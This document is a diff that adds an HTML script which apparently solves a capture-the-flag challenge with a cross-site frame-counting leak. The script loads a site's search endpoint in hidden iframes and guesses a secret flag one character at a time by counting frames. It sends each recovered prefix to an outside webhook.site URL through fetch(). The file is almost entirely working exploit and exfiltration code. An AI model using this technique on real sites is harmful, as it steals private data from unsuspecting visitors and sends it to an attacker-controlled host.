@@ -1,0 +1,34 @@
+<script>
+async function leak() {
+    const chars = "}_abcdefghijklmnopqrstuvwxyz0123456789";
+    let flag = "DH{";
+    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
+
+    while (true) {
+        let foundChar = false;
+        for (let char of chars) {
+            const query = flag + char;
+            const iframe = document.createElement("iframe");            
+
+            iframe.src = `/search?query=${query}`;
+            iframe.style.display = "none";
+
+            await new Promise((resolve) => {
+                iframe.onload = () => {
+                    if (iframe.contentWindow.frames.length > 0) {
+                        flag += char;
+                        foundChar = true;
+                        fetch(`${webhook}?flag=${flag}`);
+                    }
+                    document.body.removeChild(iframe);
+                    resolve();
+                };
+                document.body.appendChild(iframe);
+            });
+            if (foundChar) break;
+        }
+        if (flag.endsWith("}") || !foundChar) break;
+    }
+}
+leak();
+</script>
